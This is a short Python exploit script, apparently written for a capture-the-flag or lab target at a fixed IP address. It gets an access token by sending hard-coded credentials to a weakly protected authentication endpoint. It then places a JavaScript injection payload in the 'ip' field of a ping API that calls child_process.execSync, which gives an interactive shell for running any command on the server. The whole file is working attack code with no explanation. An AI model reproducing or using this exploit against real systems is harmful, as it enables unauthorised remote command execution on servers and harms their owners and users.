import requests
from os import system

# Base url
base = "http://94.237.51.88:37391"

proxy = {
    "http": "http://127.0.0.1:8080"
}

headers = {
    "user-agent": "Mozilla/5.0",
    "content-type": "application/json"
}

# Function to retrive the token exploiting a weak authentication mechanism 

def get_token():
    data = {
        "uid": "1",
        "sid": "15999999999236"
    }
    url = base + "/api/auth/authenticate"
    response = requests.post(url, headers=headers, json=data, proxies=proxy)
    return response.json()["token"]

# Function to exploit the RCE vulnerability maybe you need to change process.exit() 
# if the the backend is not automatically restarting the process
def blid_rce(token, command):
    headers["Authorization"] = f"Bearer {token}"
    url = base + "/api/service/ping"

    while True:
        if command == "exit":
            break
        elif command == "clear":
            system("clear")
        else:
            data = {
                "external": "true",
                "ip": "{\"ip\":\"127.0.0.1\"}'); var result = require('child_process').execSync(`"+command+"`).toString(); res.send(result); process.exit(); //"
             }
            response = requests.post(url, headers=headers, json=data, proxies=proxy)
        
        if response.status_code == 200:
            print(response.text)

        command = input("\n=> ")

if __name__ == "__main__":
    token = get_token()
    command = input("Command: ")
    blid_rce(token, command)